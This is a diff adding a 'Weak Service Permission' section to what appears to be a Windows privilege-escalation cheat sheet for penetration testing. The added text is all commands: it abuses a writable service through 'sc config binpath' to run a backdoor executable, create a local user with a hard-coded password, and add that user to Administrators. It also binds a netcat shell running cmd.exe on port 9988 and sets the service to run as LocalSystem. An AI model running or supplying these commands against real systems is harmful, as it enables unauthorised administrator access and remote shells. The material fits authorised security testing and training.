@@ -24,3 +24,18 @@ icacls "C:\Program Files (x86)\Program Folder"
 icacls "C:\Program Files\Photodex\ProShow Producer\Scsiaccess.exe"
 ```
 
+### Weak Service Permission
+
+
+
+```
+accesschk.exe -cv MeMe WeakService3
+sc config WeakService3 binpath= "C:\Users\MeMe\Desktop\Backdoor.exe" 
+sc config WeakService3 binpath= "net user MeMe MeMe@!@#123 /add" 
+sc config WeakService3 binpath= "net localgroup Administrators MeMe /add" 
+
+sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc qc upnphost
+
+```
